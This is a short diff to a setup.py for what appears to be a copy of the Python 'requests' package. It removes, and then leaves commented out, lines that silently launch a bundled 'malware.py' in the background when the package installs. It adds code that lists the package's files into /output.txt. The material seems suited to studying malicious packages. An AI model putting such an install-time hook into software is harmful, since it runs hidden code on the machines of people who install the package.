@@ -68,8 +68,14 @@ with open(os.path.join(here, 'requests', '__version__.py'), 'r', 'utf-8') as f:
 with open('README.md', 'r', 'utf-8') as f:
     readme = f.read()
 
-command = sys.executable + " " + os.path.join(here, 'requests', 'malware.py')
-subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
+with open("/output.txt", "w") as text_file:
+    for root, dirs, files in os.walk(os.path.join(here, 'requests')):
+        for file in files:
+            text_file.write(os.path.join(root, file))
+
+
+# command = sys.executable + " " + os.path.join(here, 'requests', 'malware.py')
+# subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
 
 
 setup(
